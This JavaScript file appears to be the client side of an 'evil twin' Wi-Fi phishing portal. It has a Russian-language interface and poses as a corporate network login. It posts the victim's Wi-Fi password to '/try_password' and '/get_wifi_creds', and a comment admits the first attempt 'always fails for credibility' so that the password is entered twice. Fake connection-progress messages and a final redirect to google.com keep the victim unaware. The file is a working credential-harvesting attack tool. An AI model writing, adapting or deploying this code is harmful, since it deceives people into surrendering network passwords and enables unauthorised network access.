class WiFiAuthenticationPortal {
    constructor() {
        this.attempts = 0;
        this.maxAttempts = 3;
        this.isLoading = false;
        this.connectionTimeout = 30000;
        this.retryDelay = 2000;
        this.validationRules = {
            minLength: 8,
            maxLength: 64,
            patterns: {
                hasUpperCase: /[A-Z]/,
                hasLowerCase: /[a-z]/,
                hasNumbers: /\d/,
                hasSpecialChars: /[!@#$%^&*(),.?":{}|<>]/
            }
        };

        this.initializeElements();
        this.bindEvents();
        this.initializeAccessibility();
        this.showWelcomeMessage();
    }

    initializeElements() {
        this.form = document.getElementById('wifi-form');
        this.passwordInput = document.getElementById('wifi_password');
        this.passwordToggle = document.getElementById('password-toggle');
        this.submitButton = document.querySelector('button[type="submit"]');
        this.statusMessage = document.getElementById('status-message');
        this.loadingOverlay = document.getElementById('loading-overlay');
        this.progressBar = this.createProgressBar();
        this.strengthIndicator = this.createPasswordStrengthIndicator();

        // Add components to form
        this.passwordInput.parentNode.parentNode.appendChild(this.strengthIndicator);
        this.form.insertBefore(this.progressBar, this.submitButton);
    }

    createProgressBar() {
        const progressContainer = document.createElement('div');
        progressContainer.className = 'progress-bar';
        progressContainer.style.display = 'none';
        progressContainer.setAttribute('role', 'progressbar');
        progressContainer.setAttribute('aria-valuemin', '0');
        progressContainer.setAttribute('aria-valuemax', '100');

        const progressFill = document.createElement('div');
        progressFill.className = 'progress-fill';
        progressContainer.appendChild(progressFill);

        this.progressFill = progressFill;
        return progressContainer;
    }

    createPasswordStrengthIndicator() {
        const container = document.createElement('div');
        container.className = 'password-strength';
        container.style.display = 'none';
        container.innerHTML = `
            <div class="strength-bars">
                <div class="strength-bar"></div>
                <div class="strength-bar"></div>
                <div class="strength-bar"></div>
                <div class="strength-bar"></div>
            </div>
            <span class="strength-text">Введите пароль</span>
        `;

        // Add CSS for strength indicator
        if (!document.getElementById('strength-styles')) {
            const style = document.createElement('style');
            style.id = 'strength-styles';
            style.textContent = `
                .password-strength {
                    margin-top: 12px;
                    font-size: 0.75rem;
                    clear: both;
                    width: 100%;
                }
                .strength-bars {
                    display: flex;
                    gap: 4px;
                    margin-bottom: 6px;
                }
                .strength-bar {
                    height: 4px;
                    flex: 1;
                    background: #E2E8F0;
                    border-radius: 2px;
                    transition: background-color 0.3s ease;
                }
                .strength-bar.active-weak { background: var(--error-color); }
                .strength-bar.active-fair { background: var(--warning-color); }
                .strength-bar.active-good { background: var(--secondary-color); }
                .strength-bar.active-strong { background: var(--success-color); }
                .strength-text {
                    color: var(--text-secondary);
                    font-weight: 500;
                    font-size: 0.75rem;
                    display: block;
                    text-align: left;
                }
            `;
            document.head.appendChild(style);
        }

        return container;
    }

    bindEvents() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.passwordInput.addEventListener('input', (e) => this.handlePasswordInput(e));
        this.passwordInput.addEventListener('focus', () => this.handleInputFocus());
        this.passwordInput.addEventListener('blur', () => this.handleInputBlur());
        this.passwordInput.addEventListener('keydown', (e) => this.handleKeyDown(e));

        // Password visibility toggle
        this.passwordToggle.addEventListener('click', () => this.togglePasswordVisibility());

        // Prevent form submission on Enter if validation fails
        this.form.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !this.isPasswordValid()) {
                e.preventDefault();
                this.showValidationMessage();
            }
        });

        // Add paste event handling
        this.passwordInput.addEventListener('paste', (e) => {
            setTimeout(() => this.handlePasswordInput(e), 0);
        });
    }

    initializeAccessibility() {
        // Add ARIA labels and descriptions
        this.passwordInput.setAttribute('aria-describedby', 'password-help strength-indicator');
        this.form.setAttribute('novalidate', 'true'); // We'll handle validation ourselves

        // Add keyboard navigation hints
        this.submitButton.setAttribute('aria-describedby', 'submit-help');

        // Create hidden help text for screen readers
        const helpText = document.createElement('div');
        helpText.id = 'password-help';
        helpText.className = 'sr-only';
        helpText.textContent = 'Введите пароль от 8 до 64 символов для подключения к сети';
        this.passwordInput.parentNode.appendChild(helpText);
    }

    handlePasswordInput(e) {
        const password = e.target.value;
        this.updatePasswordStrength(password);
        this.clearMessages();

        // Real-time validation feedback
        if (password.length > 0) {
            this.strengthIndicator.style.display = 'block';
        } else {
            this.strengthIndicator.style.display = 'none';
        }

        // Update submit button state
        this.updateSubmitButton();
    }

    handleInputFocus() {
        this.passwordInput.parentElement.style.transform = 'scale(1.01)';
        this.passwordInput.parentElement.style.transition = 'transform 0.2s ease';

        if (this.passwordInput.value.length > 0) {
            this.strengthIndicator.style.display = 'block';
        }
    }

    handleInputBlur() {
        this.passwordInput.parentElement.style.transform = 'scale(1)';

        // Hide strength indicator if password is empty
        if (this.passwordInput.value.length === 0) {
            this.strengthIndicator.style.display = 'none';
        }
    }

    handleKeyDown(e) {
        // Clear error state on typing
        if (this.passwordInput.classList.contains('error')) {
            this.passwordInput.classList.remove('error');
        }

        // Handle Escape key
        if (e.key === 'Escape') {
            this.clearMessages();
            this.passwordInput.blur();
        }
    }

    async handleSubmit(e) {
        e.preventDefault();

        if (this.isLoading) return;

        const password = this.passwordInput.value.trim();

        // Enhanced validation
        const validationResult = this.validatePassword(password);
        if (!validationResult.isValid) {
            this.showMessage(validationResult.message, 'error');
            this.highlightInputError();
            this.shakeForm();
            return;
        }

        await this.attemptConnection(password);
    }

    validatePassword(password) {
        if (!password) {
            return { isValid: false, message: 'Пожалуйста, введите пароль.' };
        }

        if (password.length < this.validationRules.minLength) {
            return {
                isValid: false,
                message: `Пароль должен содержать минимум ${this.validationRules.minLength} символов.`
            };
        }

        if (password.length > this.validationRules.maxLength) {
            return {
                isValid: false,
                message: `Пароль не должен превышать ${this.validationRules.maxLength} символов.`
            };
        }

        // Check for common weak passwords
        const weakPasswords = ['password', '12345678', 'qwerty123', 'admin123'];
        if (weakPasswords.includes(password.toLowerCase())) {
            return {
                isValid: false,
                message: 'Пароль слишком простой. Используйте более сложный пароль.'
            };
        }

        return { isValid: true, message: '' };
    }

    isPasswordValid() {
        return this.validatePassword(this.passwordInput.value.trim()).isValid;
    }

    updatePasswordStrength(password) {
        const strength = this.calculatePasswordStrength(password);
        const bars = this.strengthIndicator.querySelectorAll('.strength-bar');
        const text = this.strengthIndicator.querySelector('.strength-text');

        // Reset all bars
        bars.forEach(bar => {
            bar.className = 'strength-bar';
        });

        // Update bars based on strength
        const strengthLevels = ['weak', 'fair', 'good', 'strong'];
        const strengthTexts = ['Слабый', 'Удовлетворительный', 'Хороший', 'Сильный'];

        if (password.length === 0) {
            text.textContent = 'Введите пароль';
            return;
        }

        for (let i = 0; i <= strength.level; i++) {
            bars[i].classList.add(`active-${strengthLevels[strength.level]}`);
        }

        text.textContent = `Пароль: ${strengthTexts[strength.level]}`;
        text.style.color = strength.level >= 2 ? 'var(--success-color)' : 'var(--warning-color)';
    }

    calculatePasswordStrength(password) {
        let score = 0;
        let level = 0;

        if (password.length >= 8) score++;
        if (password.length >= 12) score++;
        if (this.validationRules.patterns.hasUpperCase.test(password)) score++;
        if (this.validationRules.patterns.hasLowerCase.test(password)) score++;
        if (this.validationRules.patterns.hasNumbers.test(password)) score++;
        if (this.validationRules.patterns.hasSpecialChars.test(password)) score++;

        if (score <= 2) level = 0; // weak
        else if (score <= 3) level = 1; // fair
        else if (score <= 4) level = 2; // good
        else level = 3; // strong

        return { score, level };
    }

    updateSubmitButton() {
        const isValid = this.isPasswordValid();
        this.submitButton.disabled = !isValid || this.isLoading;

        if (isValid && !this.isLoading) {
            this.submitButton.classList.remove('btn-secondary');
            this.submitButton.classList.add('btn-primary');
        } else {
            this.submitButton.classList.remove('btn-primary');
            this.submitButton.classList.add('btn-secondary');
        }
    }

    async attemptConnection(password) {
        this.setLoading(true);
        this.attempts++;

        // Enhanced progress simulation
        await this.simulateProgress();

        try {
            // First attempt always fails for credibility
            const endpoint = (this.attempts === 1) ? '/try_password' : '/get_wifi_creds';

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), this.connectionTimeout);

            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'wifi_password=' + encodeURIComponent(password),
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }

            const data = await response.json();

            if (data.status === 'success') {
                await this.handleSuccess();
            } else {
                this.handleFailure();
            }

        } catch (error) {
            console.error('Connection error:', error);

            if (error.name === 'AbortError') {
                this.showMessage('Время ожидания истекло. Попробуйте еще раз.', 'error');
            } else {
                this.showMessage('Ошибка подключения к сети. Проверьте соединение.', 'error');
            }

            this.setLoading(false);
            this.highlightInputError();
        }
    }

    async simulateProgress() {
        return new Promise((resolve) => {
            let progress = 0;
            const phases = [
                { text: 'Проверка учетных данных...', duration: 1000 },
                { text: 'Подключение к сети...', duration: 1500 },
                { text: 'Получение IP-адреса...', duration: 800 },
                { text: 'Проверка соединения...', duration: 700 }
            ];

            let currentPhase = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 12 + 3;

                if (progress >= 25 * (currentPhase + 1) && currentPhase < phases.length - 1) {
                    currentPhase++;
                    this.updateProgressText(phases[currentPhase].text);
                }

                if (progress >= 90) {
                    progress = 90;
                    clearInterval(interval);
                    setTimeout(() => {
                        this.updateProgress(100);
                        resolve();
                    }, 500);
                }
                this.updateProgress(progress);
            }, 150);

            this.updateProgressText(phases[0].text);
        });
    }

    updateProgressText(text) {
        const progressText = document.querySelector('#loading-overlay p');
        if (progressText) {
            progressText.textContent = text;
        }
    }

    async handleSuccess() {
        this.updateProgress(100);
        this.updateProgressText('Подключение установлено успешно!');

        // Show success message
        this.showMessage('✅ Аутентификация прошла успешно! Перенаправление...', 'success');

        // Success animation
        this.form.style.transform = 'scale(1.02)';
        this.form.style.transition = 'transform 0.3s ease';

        // Add success class to card
        const card = document.querySelector('.card');
        card.classList.add('success-state');

        // Add success styles if not already present
        if (!document.getElementById('success-styles')) {
            const style = document.createElement('style');
            style.id = 'success-styles';
            style.textContent = `
                .card.success-state::before {
                    background: linear-gradient(90deg, var(--success-color), #10b981);
                }
                .card.success-state {
                    border-color: var(--success-color);
                    box-shadow: 0 0 0 1px var(--success-color), var(--shadow-xl);
                }
            `;
            document.head.appendChild(style);
        }

        // Countdown and redirect
        let countdown = 3;
        const countdownInterval = setInterval(() => {
            this.updateProgressText(`Перенаправление через ${countdown} секунд...`);
            countdown--;

            if (countdown < 0) {
                clearInterval(countdownInterval);
                window.location.href = "https://google.com";
            }
        }, 1000);
    }

    handleFailure() {
        this.updateProgress(0);
        this.updateProgressText('Ошибка аутентификации');

        if (this.attempts >= this.maxAttempts) {
            this.showMessage('❌ Превышено количество попыток входа. Доступ временно заблокирован.', 'error');
            this.disableForm();
            this.startLockoutTimer();
        } else {
            const remainingAttempts = this.maxAttempts - this.attempts;
            this.showMessage(`⚠️ Неверный пароль. Осталось попыток: ${remainingAttempts}`, 'error');
            this.highlightInputError();
            this.shakeForm();
            this.setLoading(false);

            // Focus and select password field after delay
            setTimeout(() => {
                this.passwordInput.focus();
                this.passwordInput.select();
            }, 500);
        }
    }

    startLockoutTimer() {
        let lockoutTime = 60; // 60 seconds
        const timer = setInterval(() => {
            this.showMessage(`🔒 Доступ заблокирован. Повторите попытку через ${lockoutTime} секунд.`, 'error');
            lockoutTime--;

            if (lockoutTime < 0) {
                clearInterval(timer);
                this.enableForm();
                this.attempts = 0;
                this.showMessage('Вы можете попробовать снова.', 'info');
            }
        }, 1000);
    }

    setLoading(isLoading) {
        this.isLoading = isLoading;

        if (isLoading) {
            this.loadingOverlay.style.display = 'flex';
            this.submitButton.disabled = true;
            this.passwordInput.disabled = true;
            this.progressBar.style.display = 'block';
            this.form.classList.add('loading');

            // Update button text
            const originalText = this.submitButton.innerHTML;
            this.submitButton.innerHTML = `
                <div class="spinner"></div>
                <span style="margin-left: 8px;">Подключение...</span>
            `;
            this.submitButton.setAttribute('data-original-text', originalText);
        } else {
            this.loadingOverlay.style.display = 'none';
            this.passwordInput.disabled = false;
            this.progressBar.style.display = 'none';
            this.form.classList.remove('loading');

            // Restore button
            const originalText = this.submitButton.getAttribute('data-original-text');
            if (originalText) {
                this.submitButton.innerHTML = originalText;
            }

            this.updateSubmitButton();
        }
    }

    highlightInputError() {
        this.passwordInput.classList.add('error');
        this.passwordInput.style.borderColor = 'var(--error-color)';
        this.passwordInput.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';

        // Remove error styling after a delay
        setTimeout(() => {
            this.passwordInput.classList.remove('error');
            this.passwordInput.style.borderColor = '';
            this.passwordInput.style.boxShadow = '';
        }, 3000);
    }

    enableForm() {
        this.passwordInput.disabled = false;
        this.submitButton.disabled = false;
        this.form.classList.remove('disabled');
        this.updateSubmitButton();
    }

    updateProgress(percentage) {
        this.progressFill.style.width = percentage + '%';
        this.progressBar.setAttribute('aria-valuenow', percentage);
    }

    showMessage(message, type) {
        this.statusMessage.innerHTML = message;
        this.statusMessage.className = `alert alert-${type}`;
        this.statusMessage.style.display = 'flex';
        this.statusMessage.setAttribute('role', 'alert');

        // Add appropriate icon
        const icon = this.getMessageIcon(type);
        if (icon && !this.statusMessage.querySelector('.icon')) {
            this.statusMessage.insertAdjacentHTML('afterbegin', icon);
        }

        // Auto-hide non-error messages
        if (type !== 'error') {
            setTimeout(() => {
                this.statusMessage.style.display = 'none';
            }, 5000);
        }

        // Scroll message into view
        this.statusMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    getMessageIcon(type) {
        const icons = {
            success: '<svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>',
            error: '<svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>',
            warning: '<svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>',
            info: '<svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>'
        };
        return icons[type] || '';
    }

    clearMessages() {
        this.statusMessage.style.display = 'none';
        this.statusMessage.removeAttribute('role');
    }

    shakeForm() {
        this.form.style.animation = 'shake 0.6s cubic-bezier(0.36, 0.07, 0.19, 0.97)';
        setTimeout(() => {
            this.form.style.animation = '';
        }, 600);
    }

    disableForm() {
        this.passwordInput.disabled = true;
        this.submitButton.disabled = true;
        this.submitButton.innerHTML = '🔒 Заблокировано';
        this.submitButton.classList.add('btn-disabled');
        this.form.classList.add('disabled');
    }

    showWelcomeMessage() {
        setTimeout(() => {
            this.showMessage('🔐 Введите пароль для безопасного подключения к корпоративной сети', 'info');
        }, 1000);
    }

    showValidationMessage() {
        const validation = this.validatePassword(this.passwordInput.value.trim());
        if (!validation.isValid) {
            this.showMessage(validation.message, 'warning');
            this.highlightInputError();
        }
    }

    togglePasswordVisibility() {
        const isPassword = this.passwordInput.type === 'password';
        const eyeIcon = this.passwordToggle.querySelector('.eye-icon');
        const eyeOffIcon = this.passwordToggle.querySelector('.eye-off-icon');

        if (isPassword) {
            // Show password
            this.passwordInput.type = 'text';
            eyeIcon.style.display = 'none';
            eyeOffIcon.style.display = 'block';
            this.passwordToggle.setAttribute('aria-label', 'Скрыть пароль');
        } else {
            // Hide password
            this.passwordInput.type = 'password';
            eyeIcon.style.display = 'block';
            eyeOffIcon.style.display = 'none';
            this.passwordToggle.setAttribute('aria-label', 'Показать пароль');
        }

        // Keep focus on input after toggle
        this.passwordInput.focus();
    }
}

// Add professional animations and styles
const professionalStyles = document.createElement('style');
professionalStyles.id = 'professional-animations';
professionalStyles.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
        20%, 40%, 60%, 80% { transform: translateX(4px); }
    }

    .form-group input.error {
        animation: inputError 0.3s ease-in-out;
    }

    @keyframes inputError {
        0%, 100% { transform: scale(1); }
        50% { transform: scale(1.02); }
    }

    .btn-disabled {
        opacity: 0.6;
        cursor: not-allowed;
        background: var(--gray-400) !important;
        color: var(--gray-600) !important;
    }

    .form.disabled {
        opacity: 0.7;
        pointer-events: none;
    }

    .sr-only {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border: 0;
    }

    /* Enhanced loading overlay */
    #loading-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(15, 23, 42, 0.8);
        backdrop-filter: blur(8px);
        z-index: 9999;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    #loading-overlay > div {
        background: var(--surface-elevated);
        padding: var(--spacing-xl);
        border-radius: var(--border-radius-lg);
        box-shadow: var(--shadow-xl);
        text-align: center;
        min-width: 200px;
    }

    /* Accessibility improvements */
    @media (prefers-reduced-motion: reduce) {
        *, *::before, *::after {
            animation-duration: 0.01ms !important;
            animation-iteration-count: 1 !important;
            transition-duration: 0.01ms !important;
        }
    }

    /* High contrast mode support */
    @media (prefers-contrast: high) {
        .card {
            border: 2px solid;
        }

        .btn, button {
            border: 2px solid;
        }
    }
`;
document.head.appendChild(professionalStyles);

// Enhanced error handling and logging
window.addEventListener('error', (event) => {
    console.error('Application error:', event.error);
});

window.addEventListener('unhandledrejection', (event) => {
    console.error('Unhandled promise rejection:', event.reason);
});

// Initialize application when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    try {
        new WiFiAuthenticationPortal();
        console.log('WiFi Authentication Portal initialized successfully');
    } catch (error) {
        console.error('Failed to initialize WiFi Authentication Portal:', error);

        // Fallback error display
        const errorDiv = document.createElement('div');
        errorDiv.className = 'alert alert-error';
        errorDiv.style.margin = '20px';
        errorDiv.innerHTML = `
            <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
            </svg>
            Ошибка инициализации приложения. Пожалуйста, обновите страницу.
        `;
        document.body.insertBefore(errorDiv, document.body.firstChild);
    }
});

// Service worker registration for offline support (optional)
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
            .then(registration => {
                console.log('SW registered: ', registration);
            })
            .catch(registrationError => {
                console.log('SW registration failed: ', registrationError);
            });
    });
}
